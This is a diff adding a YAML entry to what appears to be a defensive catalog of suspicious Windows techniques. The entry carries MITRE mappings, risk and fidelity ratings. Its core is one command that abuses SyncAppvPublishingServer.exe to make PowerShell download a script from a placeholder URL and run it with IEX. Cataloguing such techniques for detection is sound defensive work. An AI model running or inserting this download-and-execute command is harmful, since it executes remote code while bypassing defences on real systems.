@@ -1,0 +1,21 @@
+- command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+  description: Download a remote payload via PowerShell and executing it via SyncAppvPublishingServer.exe.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - url1
+  risk: Critical
+  risk_reason: This is an extremely suspicious action.
+  fidelity: High
+  fidelity_reason: This binary is never typically used unless App-V is deployed and in-use - even so, seeing it in combination with a remote payload is a red flag.
+  tool: SyncAppvPublishingServer
+  threatactors:
+    N/A:
+      - N/A
